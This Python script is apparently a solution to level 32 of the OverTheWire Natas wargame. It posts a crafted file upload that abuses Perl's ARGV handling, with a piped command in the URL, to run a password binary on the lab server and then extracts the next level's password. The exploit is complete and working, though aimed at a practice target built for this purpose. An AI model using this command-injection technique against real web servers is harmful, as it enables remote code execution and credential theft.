import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '32'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas32', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    payload_file = {'file': ('a.csv', 'a, b\nc, d')} 
    payload = {'file':'ARGV'}
    #passing ?ls%20.%20| lists the webroot, which also shows a 'getpassword' compiled c file, run that:
    r = requests.post('http://natas32.natas.labs.overthewire.org/index.pl?./getpassword%20|', data=payload, files=payload_file, auth=auth)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[1])

if __name__ == "__main__":
    get_pass()
